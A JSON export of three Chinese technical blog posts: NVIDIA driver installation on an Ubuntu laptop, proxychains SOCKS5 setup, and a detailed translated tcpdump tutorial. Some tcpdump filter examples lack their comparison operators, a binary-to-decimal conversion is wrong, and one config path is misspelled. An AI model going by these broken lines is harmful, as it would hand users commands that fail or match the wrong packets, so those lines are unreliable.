[{"title":"小米13寸指纹版笔记本在ubuntu16.04下安装nvidia显卡驱动","url":"/2017/07/31/system/小米13寸指纹版笔记本在ubuntu16-04下安装nvidia显卡驱动/","content":"\n目前(2017-7-31)nvidia已经推出了，mx150的驱动，但ubuntu官方源里面还没有收录，所以先添加PPA：\n\n<!-- more -->\n\n```sh\nsudo add-apt-repository ppa:graphics-drivers/ppa\nsudo apt update\n```\n\n此时再看 附加驱动 应用里面已经有对应的驱动啦，可以选择安装，也可以用命令行安装，这里先用命令行安装：\n\n```sh\nsudo apt install nvidia-settings nvidia-opencl-icd-384 nvidia-prime nvidia-384\n```\n\n安装完成后重启系统，nvidia显卡就在启用了，打开 NVIDIA SETTINGS 应用可以查看详细信息。\n\n为了能够更方便的切换显卡，可以安装显卡切换指示器，具体如下：\n\n```sh\nsudo add-apt-repository ppa:nilarimogard/webupd8\nsudo apt-get update\nsudo apt install prime-indicator-plus\n```\n重启后可在系统任务栏上看到。","tags":["desktop"],"categories":["system"]},{"title":"利用proxychains在终端使用socks5代理","url":"/2017/06/20/service/利用proxychains在终端使用socks5代理/","content":"\n最近用各种脚本下载东西的时候发现有的站点需要当地IP才能下，比如.....nico, youtube等；所以就找了下能在终端用socks5代理的工具，最后找到了proxychains，从此再无压力。\n\n<!-- more -->\n\n# proxychains安装\n\nubuntu下安装:\n\n```sh\nsudo apt-get install proxychains\n```\n\n编译安装:\n\n```sh\ngit clone https://github.com/rofl0r/proxychains-ng.git\ncd proxychains-ng\n./configure\nmake\nsudo make install\nsudo cp ./src/proxychains.conf /etc/proxychians.conf\ncd .. && rm -rf proxychains-ng\n```\n\n# 编辑proxychains配置\n\n```sh\nvim /etc/proxychains.conf\n```\n\n将socks4 127.0.0.1 9095改为\n\nsocks5  127.0.0.1 1080  //1080改为你自己的端口\n\n# 使用方法\n\n在需要代理的命令前加上 `proxychains` ，如：\n\n```sh\nproxychains wget http://xxx.com/xxx.zip\n```\n","tags":["proxy"],"categories":["service"]},{"title":"tcpdump命令详解","url":"/2017/06/16/security/tcpdump命令详解/","content":"\n# 简介\n\n用简单的话来定义tcpdump，就是：dump the traffic on a network，根据使用者的定义对网络上的数据包进行截获的包分析工具。 tcpdump可以将网络中传送的数据包的“头”完全截获下来提供分析。它支持针对网络层、协议、主机、网络或端口的过滤，并提供and、or、not等逻辑语句来帮助你去掉无用的信息。\n\n<!-- more -->\n\n# 实用命令实例\n\n## 默认启动\n```sh\ntcpdump\n```\n\n普通情况下，直接启动tcpdump将监视第一个网络接口上所有流过的数据包。\n\n## 监视指定网络接口的数据包\n```sh\ntcpdump -i eth1\n```\n\n如果不指定网卡，默认tcpdump只会监视第一个网络接口，一般是eth0，下面的例子都没有指定网络接口。　\n\n## 监视指定主机的数据包\n\n打印所有进入或离开sundown的数据包.\n```sh\ntcpdump host sundown\n```\n\n也可以指定ip,例如截获所有210.27.48.1 的主机收到的和发出的所有的数据包\n```sh\ntcpdump host 210.27.48.1 \n```\n\n打印helios 与 hot 或者与 ace 之间通信的数据包\n```sh\ntcpdump host helios and \\( hot or ace \\)\n```\n\n截获主机210.27.48.1 和主机210.27.48.2 或210.27.48.3的通信\n```sh\ntcpdump host 210.27.48.1 and \\ (210.27.48.2 or 210.27.48.3 \\) \n```\n\n打印ace与任何其他主机之间通信的IP 数据包, 但不包括与helios之间的数据包.\n```sh\ntcpdump ip host ace and not helios\n```\n\n如果想要获取主机210.27.48.1除了和主机210.27.48.2之外所有主机通信的ip包，使用命令：\n```sh\ntcpdump ip host 210.27.48.1 and ! 210.27.48.2\n```\n\n截获主机hostname发送的所有数据\n```sh\ntcpdump -i eth0 src host hostname\n```\n\n监视所有送到主机hostname的数据包\n```sh\ntcpdump -i eth0 dst host hostname\n```\n\n## 监视指定主机和端口的数据包\n\n如果想要获取主机210.27.48.1接收或发出的telnet包，使用如下命令\n```sh\ntcpdump tcp port 23 and host 210.27.48.1\n```\n\n对本机的udp 123 端口进行监视 123 为ntp的服务端口\n```sh\ntcpdump udp port 123 \n```\n \n## 监视指定网络的数据包\n\n打印本地主机与Berkeley网络上的主机之间的所有通信数据包(nt: ucb-ether, 此处可理解为'Berkeley网络'的网络地址,此表达式最原始的含义可表达为: 打印网络地址为ucb-ether的所有数据包)\n```sh\ntcpdump net ucb-ether\n```\n\n打印所有通过网关snup的ftp数据包(注意, 表达式被单引号括起来了, 这可以防止shell对其中的括号进行错误解析)\n```sh\ntcpdump 'gateway snup and (port ftp or ftp-data)'\n```\n\n打印所有源地址或目标地址是本地主机的IP数据包\n\n(如果本地网络通过网关连到了另一网络, 则另一网络并不能算作本地网络.(nt: 此句翻译曲折,需补充).localnet 实际使用时要真正替换成本地网络的名字)\n```sh\ntcpdump ip and not net localnet\n```\n \n## 监视指定协议的数据包\n\n打印TCP会话中的的开始和结束数据包, 并且数据包的源或目的不是本地网络上的主机.(nt: localnet, 实际使用时要真正替换成本地网络的名字))\n```sh\ntcpdump 'tcp[tcpflags] & (tcp-syn|tcp-fin) != 0 and not src and dst net localnet'\n```\n\n打印所有源或目的端口是80, 网络层协议为IPv4, 并且含有数据,而不是SYN,FIN以及ACK-only等不含数据的数据包.(ipv6的版本的表达式可做练习)\n```sh\ntcpdump 'tcp port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)'\n```\n(nt: 可理解为, ip[2:2]表示整个ip数据包的长度, (ip[0]&0xf)<<2)表示ip数据包包头的长度(ip[0]&0xf代表包中的IHL域, 而此域的单位为32bit, 要换算成字节数需要乘以4,　即左移2.　(tcp[12]&0xf0)>>4 表示tcp头的长度, 此域的单位也是32bit,　换算成比特数为 ((tcp[12]&0xf0) >> 4)　<<　２,　即 ((tcp[12]&0xf0)>>2).　((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0　表示: 整个ip数据包的长度减去ip头的长度,再减去tcp头的长度不为0, 这就意味着, ip数据包中确实是有数据.对于ipv6版本只需考虑ipv6头中的'Payload Length' 与 'tcp头的长度'的差值, 并且其中表达方式'ip[]'需换成'ip6[]'.)\n\n打印长度超过576字节, 并且网关地址是snup的IP数据包\n```sh\ntcpdump 'gateway snup and ip[2:2] > 576'\n```\n\n打印所有IP层广播或多播的数据包， 但不是物理以太网层的广播或多播数据报\n```sh\ntcpdump 'ether[0] & 1 = 0 and ip[16] >= 224'\n```\n\n打印除'echo request'或者'echo reply'类型以外的ICMP数据包( 比如,需要打印所有非ping 程序产生的数据包时可用到此表达式 .\n(nt: 'echo reuqest' 与 'echo reply' 这两种类型的ICMP数据包通常由ping程序产生))\n```sh\ntcpdump 'icmp[icmptype] != icmp-echo and icmp[icmptype] != icmp-echoreply'\n```\n\n## tcpdump 与wireshark\n\nWireshark(以前是ethereal)是非常简单易用的抓包工具。但在Linux和windowns下是图形化抓包工具。我们可以用Tcpdump + Wireshark 的完美组合实现：在 Linux 里抓包，然后在Windows 里分析包。\n```sh\ntcpdump tcp -i eth1 -t -s 0 -c 100 and dst port ! 22 and src net 192.168.1.0/24 -w ./target.cap\n```\n\n1. tcp: ip icmp arp rarp 和 tcp、udp、icmp这些选项等都要放到第一个参数的位置，用来过滤数据报的类型\n2. -i eth1 : 只抓经过接口eth1的包\n3. -t : 不显示时间戳\n4. -s 0 : 抓取数据包时默认抓取长度为68字节。加上-S 0 后可以抓到完整的数据包\n5. -c 100 : 只抓取100个数据包\n6. dst port ! 22 : 不抓取目标端口是22的数据包\n7. src net 192.168.1.0/24 : 数据包的源网络地址为192.168.1.0/24\n8. -w ./target.cap : 保存成cap文件，方便用ethereal(即wireshark)分析\n\n## 使用tcpdump抓取HTTP包\n```sh\ntcpdump  -XvvennSs 0 -i eth0 tcp[20:2]=0x4745 or tcp[20:2]=0x4854\n```\n\n0x4745 为\"GET\"前两个字母\"GE\",0x4854 为\"HTTP\"前两个字母\"HT\"。\n\ntcpdump 对截获的数据并没有进行彻底解码，数据包内的大部分内容是使用十六进制的形式直接打印输出的。显然这不利于分析网络故障，通常的解决办法是先使用带-w参数的tcpdump 截获数据并保存到文件中，然后再使用其他程序(如Wireshark)进行解码分析。当然也应该定义过滤规则，以避免捕获的数据包填满整个硬盘。\n \n# 输出信息含义\n\n首先我们注意一下，基本上tcpdump总的的输出格式为：系统时间 来源主机.端口 > 目标主机.端口 数据包参数\n\ntcpdump 的输出格式与协议有关.以下简要描述了大部分常用的格式及相关例子.\n\n## 链路层头\n\n对于FDDI网络, '-e' 使tcpdump打印出指定数据包的'frame control' 域, 源和目的地址, 以及包的长度.(frame control域控制对包中其他域的解析). 一般的包(比如那些IP datagrams)都是带有'async'(异步标志)的数据包，并且有取值0到7的优先级;比如 'async4'就代表此包为异步数据包，并且优先级别为4. 通常认为,这些包们会内含一个 LLC包(逻辑链路控制包); 这时,如果此包不是一个ISO datagram或所谓的SNAP包，其LLC头部将会被打印(nt:应该是指此包内含的 LLC包的包头).\n\n对于Token Ring网络(令牌环网络), '-e' 使tcpdump打印出指定数据包的'frame control'和'access control'域, 以及源和目的地址,外加包的长度. 与FDDI网络类似, 此数据包通常内含LLC数据包. 不管 是否有'-e'选项.对于此网络上的'source-routed'类型数据包(nt:意译为:源地址被追踪的数据包,具体含义未知,需补充), 其包的源路由信息总会被打印.\n\n对于802.11网络(WLAN,即wireless local area network), '-e' 使tcpdump打印出指定数据包的'frame control域,包头中包含的所有地址, 以及包的长度.与FDDI网络类似, 此数据包通常内含LLC数据包.\n\n(注意: 以下的描述会假设你熟悉SLIP压缩算法 (nt:SLIP为Serial Line Internet Protocol.), 这个算法可以在RFC-1144中找到相关的蛛丝马迹.)\n\n对于SLIP网络(nt:SLIP links, 可理解为一个网络, 即通过串行线路建立的连接, 而一个简单的连接也可看成一个网络),数据包的'direction indicator'('方向指示标志')(\"I\"表示入, \"O\"表示出), 类型以及压缩信息将会被打印. 包类型会被首先打印.\n\n类型分为ip, utcp以及ctcp(nt:未知, 需补充). 对于ip包,连接信息将不被打印(nt:SLIP连接上,ip包的连接信息可能无用或没有定义.reconfirm).对于TCP数据包, 连接标识紧接着类型表示被打印. 如果此包被压缩, 其被编码过的头部将被打印.时对于特殊的压缩包,会如下显示:\n\n\\*S+n 或者 \\*SA+n, 其中n代表包的(顺序号或(顺序号和应答号))增加或减少的数目(nt | rt:S,SA拗口, 需再译).对于非特殊的压缩包,0个或更多的'改变'将会被打印.'改变'被打印时格式如下:\n\n'标志'+/-/=n 包数据的长度 压缩的头部长度.\n\n其中'标志'可以取以下值:\n\nU(代表紧急指针), W(指缓冲窗口), A(应答), S(序列号), I(包ID),而增量表达'=n'表示被赋予新的值, +/-表示增加或减少.\n\n比如, 以下显示了对一个外发压缩TCP数据包的打印, 这个数据包隐含一个连接标识(connection identifier); 应答号增加了6,顺序号增加了49, 包ID号增加了6; 包数据长度为3字节(octect), 压缩头部为6字节.(nt:如此看来这应该不是一个特殊的压缩数据包).\n\n## ARP/RARP 数据包\n\ntcpdump对Arp/rarp包的输出信息中会包含请求类型及该请求对应的参数. 显示格式简洁明了. 以下是从主机rtsg到主机csam的'rlogin'(远程登录)过程开始阶段的数据包样例:\n```\narp who-has csam tell rtsg\narp reply csam is-at CSAM\n```\n\n第一行表示:rtsg发送了一个arp数据包(nt:向全网段发送,arp数据包）以询问csam的以太网地址Csam（nt:可从下文看出来, 是Csam）以她自己的以太网地址做了回应(在这个例子中, 以太网地址以大写的名字标识, 而internet地址(即ip地址)以全部的小写名字标识).\n\n如果使用tcpdump -n, 可以清晰看到以太网以及ip地址而不是名字标识:\n```\narp who-has 128.3.254.6 tell 128.3.254.68\narp reply 128.3.254.6 is-at 02:07:01:00:01:c4\n```\n\n如果我们使用tcpdump -e, 则可以清晰的看到第一个数据包是全网广播的, 而第二个数据包是点对点的:\n```\nRTSG Broadcast 0806 64: arp who-has csam tell rtsg\nCSAM RTSG 0806 64: arp reply csam is-at CSAM\n```\n\n第一个数据包表明:以arp包的源以太地址是RTSG, 目标地址是全以太网段, type域的值为16进制0806(表示ETHER_ARP(nt:arp包的类型标识)),包的总长度为64字节.\n\n## TCP 数据包\n\n(注意:以下将会假定你对 RFC-793所描述的TCP熟悉. 如果不熟, 以下描述以及tcpdump程序可能对你帮助不大.(nt:警告可忽略,只需继续看, 不熟悉的地方可回头再看.).\n\n通常tcpdump对tcp数据包的显示格式如下:\n```\nsrc > dst: flags data-seqno ack window urgent options\n```\n\nsrc 和 dst 是源和目的IP地址以及相应的端口. flags 标志由S(SYN), F(FIN), P(PUSH, R(RST),W(ECN CWT(nt | rep:未知, 需补充))或者 E(ECN-Echo(nt | rep:未知,　需补充))组成,单独一个'.'表示没有flags标识. 数据段顺序号(Data-seqno)描述了此包中数据所对应序列号空间中的一个位置(nt:整个数据被分段,每段有一个顺序号, 所有的顺序号构成一个序列号空间)(可参考以下例子). Ack 描述的是同一个连接,同一个方向,下一个本端应该接收的(对方应该发送的)数据片段的顺序号. Window是本端可用的数据接收缓冲区的大小(也是对方发送数据时需根据这个大小来组织数据).\n\nUrg(urgent) 表示数据包中有紧急的数据. options 描述了tcp的一些选项, 这些选项都用尖括号来表示(如 <mss 1024>).\n\nsrc, dst 和 flags 这三个域总是会被显示. 其他域的显示与否依赖于tcp协议头里的信息.\n\n这是一个从trsg到csam的一个rlogin应用登录的开始阶段.\n```\nrtsg.1023 > csam.login: S 768512:768512(0) win 4096 <mss 1024>\ncsam.login > rtsg.1023: S 947648:947648(0) ack 768513 win 4096 <mss 1024>\nrtsg.1023 > csam.login: . ack 1 win 4096\nrtsg.1023 > csam.login: P 1:2(1) ack 1 win 4096\ncsam.login > rtsg.1023: . ack 2 win 4096\nrtsg.1023 > csam.login: P 2:21(19) ack 1 win 4096\ncsam.login > rtsg.1023: P 1:2(1) ack 21 win 4077\ncsam.login > rtsg.1023: P 2:3(1) ack 21 win 4077 urg 1\ncsam.login > rtsg.1023: P 3:4(1) ack 21 win 4077 urg 1\n```\n第一行表示有一个数据包从rtsg主机的tcp端口1023发送到了csam主机的tcp端口login上(nt:udp协议的端口和tcp协议的端口是分别的两个空间, 虽然取值范围一致). S表示设置了SYN标志. 包的顺序号是768512, 并且没有包含数据.(表示格式为:'first:last(nbytes)', 其含义是'此包中数据的顺序号从first开始直到last结束，不包括last. 并且总共包含nbytes的用户数据'.) 没有捎带应答(nt:从下文来看，第二行才是有捎带应答的数据包), 可用的接受窗口的大小为4096bytes, 并且请求端(rtsg)\n的最大可接受的数据段大小是1024字节(nt:这个信息作为请求发向应答端csam, 以便双方进一步的协商).\n\nCsam 向rtsg 回复了基本相同的SYN数据包, 其区别只是多了一个' piggy-backed ack'(nt:捎带回的ack应答, 针对rtsg的SYN数据包).\n\nrtsg 同样针对csam的SYN数据包回复了一ACK数据包作为应答. '.'的含义就是此包中没有标志被设置. 由于此应答包中不含有数据, 所以包中也没有数据段序列号. 提醒! 此ACK数据包的顺序号只是一个小整数1. 有如下解释:tcpdump对于一个tcp连接上的会话, 只打印会话两端的初始数据包的序列号,其后相应数据包只打印出与初始包序列号的差异.即初始序列号之后的序列号,　可被看作此会话上当前所传数据片段在整个要传输的数据中的'相对字节'位置(nt:双方的第一个位置都是1, 即'相对字节'的开始编号).　'-Ｓ'将覆盖这个功能,使数据包的原始顺序号被打印出来.\n\n第六行的含义为:rtsg 向 csam发送了19字节的数据(字节的编号为2到20，传送方向为rtsg到csam). 包中设置了PUSH标志. 在第7行,csam 喊到， 她已经从rtsg中收到了21以下的字节, 但不包括21编号的字节. 这些字节存放在csam的socket的接收缓冲中, 相应地,csam的接收缓冲窗口大小会减少19字节(nt:可以从第5行和第7行win属性值的变化看出来). csam在第7行这个包中也向rtsg发送了一个字节. 在第8行和第9行, csam 继续向rtsg 分别发送了两个只包含一个字节的数据包, 并且这个数据包带PUSH标志.\n\n如果所抓到的tcp包(nt:即这里的snapshot)太小了，以至tcpdump无法完整得到其头部数据, 这时, tcpdump会尽量解析这个不完整的头,并把剩下不能解析的部分显示为'[|tcp]'. 如果头部含有虚假的属性信息(比如其长度属性其实比头部实际长度长或短), tcpdump会为该头部显示'[bad opt]'. 如果头部的长度告诉我们某些选项(nt | rt:从下文来看， 指tcp包的头部中针对ip包的一些选项, 回头再翻)会在此包中,而真正的IP(数据包的长度又不够容纳这些选项, tcpdump会显示'[bad hdr length]'.\n\n抓取带有特殊标志的的TCP包(如SYN-ACK标志, URG-ACK标志等).\n\n在TCP的头部中, 有8比特(bit)用作控制位区域, 其取值为:\n```\nCWR | ECE | URG | ACK | PSH | RST | SYN | FIN\n(nt | rt:从表达方式上可推断:这8个位是用或的方式来组合的, 可回头再翻)\n```\n现假设我们想要监控建立一个TCP连接整个过程中所产生的数据包. 可回忆如下:TCP使用3次握手协议来建立一个新的连接; 其与此三次握手连接顺序对应，并带有相应TCP控制标志的数据包如下:\n\n1. 连接发起方(nt:Caller)发送SYN标志的数据包\n2. 接收方(nt:Recipient)用带有SYN和ACK标志的数据包进行回应\n3. 发起方收到接收方回应后再发送带有ACK标志的数据包进行回应\n\n```\n0 15 31\n-----------------------------------------------------------------\n| source port | destination port |\n-----------------------------------------------------------------\n| sequence number |\n-----------------------------------------------------------------\n| acknowledgment number |\n-----------------------------------------------------------------\n| HL | rsvd |C|E|U|A|P|R|S|F| window size |\n-----------------------------------------------------------------\n| TCP checksum | urgent pointer |\n-----------------------------------------------------------------\n```\n\n一个TCP头部,在不包含选项数据的情况下通常占用20个字节(nt | rt:options 理解为选项数据，需回译). 第一行包含0到3编号的字节,第二行包含编号4-7的字节.\n\n如果编号从0开始算, TCP控制标志位于13字节(nt:第四行左半部分).\n\n ```\n0 7| 15| 23| 31\n----------------|---------------|---------------|----------------\n| HL | rsvd |C|E|U|A|P|R|S|F| window size |\n----------------|---------------|---------------|----------------\n| | 13th octet | | |\n```\n\n让我们仔细看看编号13的字节:\n\n```\n| |\n|---------------|\n|C|E|U|A|P|R|S|F|\n|---------------|\n|7 5 3 0|\n```\n\n这里有我们感兴趣的控制标志位. 从右往左这些位被依次编号为0到7, 从而 PSH位在3号, 而URG位在5号.\n\n提醒一下自己, 我们只是要得到包含SYN标志的数据包. 让我们看看在一个包的包头中, 如果SYN位被设置, 到底在13号字节发生了什么:\n```\n|C|E|U|A|P|R|S|F|\n|---------------|\n|0 0 0 0 0 0 1 0|\n|---------------|\n|7 6 5 4 3 2 1 0|\n```\n\n在控制段的数据中, 只有比特1(bit number 1)被置位.\n\n假设编号为13的字节是一个8位的无符号字符型,并且按照网络字节号排序(nt:对于一个字节来说，网络字节序等同于主机字节序), 其二进制值如下所示:\n```\n00000010\n```\n转换成十进制就是:\n```\n0*2^7 + 0*2^6 + 0*2^5 + 1*2^4 + 0*2^3 + 0*2^2 + 1*2^1 + 0*2 = 18\n```\n(nt: 1 * 2^6 表示1乘以2的6次方, 也许这样更清楚些, 即把原来表达中的指数7 6 ... 0挪到了下面来表达)\n\n现在, 却不能只用'tcp[13] 18'作为tcpdump的过滤表达式, 因为这将导致只选择含有SYN-ACK标志的数据包, 其他的都被丢弃.\n\n提醒一下自己, 我们的目标是: 只要包的SYN标志被设置就行, 其他的标志我们不理会.\n\n为了达到我们的目标, 我们需要把13号字节的二进制值与其他的一个数做AND操作(nt:逻辑与)来得到SYN比特位的值. 目标是:只要SYN 被设置就行, 于是我们就把她与上13号字节的SYN值(nt: 00000010).\n```\n00010010 SYN-ACK 00000010 SYN\nAND 00000010 (we want SYN) AND 00000010 (we want SYN)\n-------- --------\n= 00000010 = 00000010\n```\n\n我们可以发现, 不管包的ACK或其他标志是否被设置, 以上的AND操作都会给我们相同的值, 其10进制表达就是2(2进制表达就是00000010).\n从而我们知道, 对于带有SYN标志的数据包, 以下的表达式的结果总是真(true):\n```\n( ( value of octet 13 ) AND ( 2 ) ) ( 2 ) (nt: value of octet 13, 即13号字节的值)\n```\n\n灵感随之而来, 我们于是得到了如下的tcpdump 的过滤表达式\n```\ntcpdump -i xl0 'tcp[13] & 2 2'\n```\n\n注意, 单引号或反斜杆(nt: 这里用的是单引号)不能省略, 这可以防止shell对&的解释或替换.\n\n## UDP 数据包\n\nUDP 数据包的显示格式，可通过rwho这个具体应用所产生的数据包来说明:\n```\nactinide.who > broadcast.who: udp 84\n```\n\n其含义为:actinide主机上的端口who向broadcast主机上的端口who发送了一个udp数据包(nt: actinide和broadcast都是指Internet地址).\n\n这个数据包承载的用户数据为84个字节.\n\n一些UDP服务可从数据包的源或目的端口来识别，也可从所显示的更高层协议信息来识别. 比如, Domain Name service requests(DNS 请求,在RFC-1034/1035中), 和Sun RPC calls to NFS(对NFS服务器所发起的远程调用(nt: 即Sun RPC)，在RFC-1050中有对远程调用的描述).\n\n### UDP 名称服务请求\n\n(注意:以下的描述假设你对Domain Service protoco(nt:在RFC-103中有所描述), 否则你会发现以下描述就是天书(nt:希腊文天书,不必理会, 吓吓你的, 接着看就行))\n\n名称服务请求有如下的格式:\n```\nsrc > dst: id op? flags qtype qclass name (len)\n(nt: 从下文来看, 格式应该是src > dst: id op flags qtype qclass? name (len))\n比如有一个实际显示为:\nh2opolo.1538 > helios.domain: 3+ A? ucbvax.berkeley.edu. (37)\n```\n\n主机h2opolo 向helios 上运行的名称服务器查询ucbvax.berkeley.edu 的地址记录(nt: qtype等于A). 此查询本身的id号为'3'. 符号'+'意味着递归查询标志被设置(nt: dns服务器可向更高层dns服务器查询本服务器不包含的地址记录). 这个最终通过IP包发送的查询请求数据长度为37字节, 其中不包括UDP和IP协议的头数据. 因为此查询操作为默认值(nt | rt: normal one的理解), op字段被省略.\n\n如果op字段没被省略, 会被显示在'3' 和'+'之间. 同样, qclass也是默认值, C_IN, 从而也没被显示, 如果没被忽略, 她会被显示在'A'之后.\n\n异常检查会在方括中显示出附加的域:　如果一个查询同时包含一个回应(nt: 可理解为, 对之前其他一个请求的回应), 并且此回应包含权威或附加记录段,　ancount, nscout, arcount(nt: 具体字段含义需补充) 将被显示为'[na]', '[nn]', '[nau]', 其中n代表合适的计数. 如果包中以下回应位(比如AA位, RA位, rcode位), 或者字节2或3中任何一个'必须为0'的位被置位(nt: 设置为1), '[b2&3]=x' 将被显示, 其中x表示头部字节2与字节3进行与操作后的值.\n\n### UDP 名称服务应答\n\n对名称服务应答的数据包，tcpdump会有如下的显示格式\n```\nsrc > dst: id op rcode flags a/n/au type class data (len)\n```\n比如具体显示如下:\n```\nhelios.domain > h2opolo.1538: 3 3/3/7 A 128.32.137.3 (273)\nhelios.domain > h2opolo.1537: 2 NXDomain* 0/1/0 (97)\n```\n\n第一行表示: helios 对h2opolo 所发送的3号查询请求回应了3条回答记录(nt | rt: answer records), 3条名称服务器记录,以及7条附加的记录. 第一个回答记录(nt: 3个回答记录中的第一个)类型为A(nt: 表示地址), 其数据为internet地址128.32.137.3.\n此回应UDP数据包, 包含273字节的数据(不包含UPD和IP的头部数据). op字段和rcode字段被忽略(nt: op的实际值为Query, rcode, 即response code的实际值为NoError), 同样被忽略的字段还有class 字段(nt | rt: 其值为C_IN, 这也是A类型记录默认取值)\n\n第二行表示: helios 对h2opolo 所发送的2号查询请求做了回应. 回应中, rcode编码为NXDomain(nt: 表示不存在的域)), 没有回答记录,但包含一个名称服务器记录, 不包含权威服务器记录(nt | ck: 从上文来看, 此处的authority records 就是上文中对应的additionalrecords). '*'表示权威服务器回答标志被设置(nt: 从而additional records就表示的是authority records).由于没有回答记录, type, class, data字段都被忽略.\n\nflag字段还有可能出现其他一些字符, 比如'-'(nt: 表示可递归地查询, 即RA 标志没有被设置), '|'(nt: 表示被截断的消息, 即TC 标志被置位). 如果应答(nt | ct: 可理解为, 包含名称服务应答的UDP数据包, tcpdump知道这类数据包该怎样解析其数据)的'question'段一个条目(entry)都不包含(nt: 每个条目的含义, 需补充),'[nq]' 会被打印出来.\n\n要注意的是:名称服务器的请求和应答数据量比较大, 而默认的68字节的抓取长度(nt: snaplen, 可理解为tcpdump的一个设置选项)可能不足以抓取数据包的全部内容. 如果你真的需要仔细查看名称服务器的负载, 可以通过tcpdump 的-s 选项来扩大snaplen值.\n\n## SMB/CIFS 解码\n\ntcpdump 已可以对SMB/CIFS/NBT相关应用的数据包内容进行解码(nt: 分别为'Server Message Block Common', 'Internet File System' '在TCP/IP上实现的网络协议NETBIOS的简称'. 这几个服务通常使用UDP的137/138以及TCP的139端口). 原来的对IPX和NetBEUI SMB数据包的解码能力依然可以被使用(nt: NetBEUI为NETBIOS的增强版本).\n\ntcpdump默认只按照最简约模式对相应数据包进行解码, 如果我们想要详尽的解码信息可以使用其-v 启动选现. 要注意的是, -v 会产生非常详细的信息,比如对单一的一个SMB数据包, 将产生一屏幕或更多的信息, 所以此选项, 确有需要才使用.\n\n关于SMB数据包格式的信息, 以及每个域的含义可以参看www.cifs.org 或者samba.org 镜像站点的pub/samba/specs/ 目录. linux 上的SMB 补丁(nt | rt: patch)由 Andrew Tridgell (tridge@samba.org)提供.\n\n\n## NFS 请求和回应\n\ntcpdump对Sun NFS(网络文件系统)请求和回应的UDP数据包有如下格式的打印输出:\n```\nsrc.xid > dst.nfs: len op args\nsrc.nfs > dst.xid: reply stat len op results\n```\n以下是一组具体的输出数据\n```\nsushi.6709 > wrl.nfs: 112 readlink fh 21,24/10.73165\nwrl.nfs > sushi.6709: reply ok 40 readlink \"../var\"\nsushi.201b > wrl.nfs:\n144 lookup fh 9,74/4096.6878 \"xcolors\"\nwrl.nfs > sushi.201b:\nreply ok 128 lookup fh 9,74/4134.3150\n```\n\n第一行输出表明: 主机sushi向主机wrl发送了一个'交换请求'(nt: transaction), 此请求的id为6709(注意, 主机名字后是交换请求id号, 而不是源端口号). 此请求数据为112字节, 其中不包括UDP和IP头部的长度. 操作类型为readlink(nt: 即此操作为读符号链接操作),操作参数为fh 21,24/10.73165(nt: 可按实际运行环境, 解析如下, fd 表示描述的为文件句柄, 21,24 表示此句柄所对应设备的主/从设备号对, 10表示此句柄所对应的i节点编号(nt:每个文件都会在操作系统中对应一个i节点, 限于unix类系统中),73165是一个编号(nt: 可理解为标识此请求的一个随机数, 具体含义需补充)).\n\n第二行中, wrl 做了'ok'的回应, 并且在results 字段中返回了sushi想要读的符号连接的真实目录(nt: 即sushi要求读的符号连接其实是一个目录).\n\n第三行表明: sushi 再次请求 wrl 在'fh 9,74/4096.6878'所描述的目录中查找'xcolors'文件. 需要注意的是, 每行所显示的数据含义依赖于其中op字段的\n类型(nt: 不同op 所对应args 含义不相同), 其格式遵循NFS 协议, 追求简洁明了.\n\n如果tcpdump 的-v选项(详细打印选项) 被设置, 附加的信息将被显示. 比如:\n```\nsushi.1372a > wrl.nfs:\n148 read fh 21,11/12.195 8192 bytes @ 24576\nwrl.nfs > sushi.1372a:\nreply ok 1472 read REG 100664 ids 417/0 sz 29388\n```\n\n(-v 选项一般还会打印出IP头部的TTL, ID， length, 以及fragmentation 域, 但在此例中, 都略过了(nt: 可理解为,简洁起见, 做了删减))\n\n在第一行, sushi 请求wrl 从文件 21,11/12.195(nt: 格式在上面有描述)中, 自偏移24576字节处开始, 读取8192字节数据.\n\nWrl 回应读取成功; 由于第二行只是回应请求的开头片段, 所以只包含1472字节(其他的数据将在接着的reply片段中到来, 但这些数据包不会再有NFS头, 甚至UDP头信息也为空(nt: 源和目的应该要有), 这将导致这些片段不能满足过滤条件, 从而没有被打印). -v 选项除了显示文件数据信息, 还会显示附加显示文件属性信息: file type(文件类型, ''REG'' 表示普通文件), file mode(文件存取模式, 8进制表示的), uid 和gid(nt: 文件属主和组属主), file size (文件大小).\n\n如果-v 标志被多次重复给出(nt: 如-vv)， tcpdump会显示更加详细的信息.\n\n必须要注意的是, NFS 请求包中数据比较多, 如果tcpdump 的snaplen(nt: 抓取长度) 取太短将不能显示其详细信息. 可使用'-s 192'来增加snaplen, 这可用以监测NFS应用的网络负载(nt: traffic).\n\nNFS 的回应包并不严格的紧随之前相应的请求包(nt: RPC operation). 从而, tcpdump 会跟踪最近收到的一系列请求包, 再通过其交换序号(nt: transaction ID)与相应请求包相匹配. 这可能产生一个问题， 如果回应包来得太迟, 超出tcpdump 对相应请求包的跟踪范围,该回应包将不能被分析.\n\n## AFS 请求和回应\n\nAFS(nt: Andrew 文件系统, Transarc , 未知, 需补充)请求和回应有如下的答应\n```\nsrc.sport > dst.dport: rx packet-type\nsrc.sport > dst.dport: rx packet-type service call call-name args\nsrc.sport > dst.dport: rx packet-type service reply call-name args\n\nelvis.7001 > pike.afsfs:\nrx data fs call rename old fid 536876964/1/1 \".newsrc.new\"\nnew fid 536876964/1/1 \".newsrc\"\npike.afsfs > elvis.7001: rx data fs reply rename\n```\n\n在第一行, 主机elvis 向pike 发送了一个RX数据包.\n\n这是一个对于文件服务的请求数据包(nt: RX data packet, 发送数据包 , 可理解为发送包过去, 从而请求对方的服务), 这也是一个RPC调用的开始(nt: RPC, remote procedure call). 此RPC 请求pike 执行rename(nt: 重命名) 操作, 并指定了相关的参数:原目录描述符为536876964/1/1, 原文件名为 '.newsrc.new', 新目录描述符为536876964/1/1, 新文件名为 '.newsrc'.\n\n主机pike 对此rename操作的RPC请求作了回应(回应表示rename操作成功, 因为回应的是包含数据内容的包而不是异常包).\n\n一般来说, 所有的'AFS RPC'请求被显示时, 会被冠以一个名字(nt: 即decode, 解码), 这个名字往往就是RPC请求的操作名.\n\n并且, 这些RPC请求的部分参数在显示时, 也会被冠以一个名字(nt | rt: 即decode, 解码, 一般来说也是取名也很直接, 比如,一个interesting 参数, 显示的时候就会直接是'interesting', 含义拗口, 需再翻).\n\n这种显示格式的设计初衷为'一看就懂', 但对于不熟悉AFS 和 RX 工作原理的人可能不是很有用(nt: 还是不用管, 书面吓吓你的, 往下看就行).\n\n如果 -v(详细)标志被重复给出(nt: 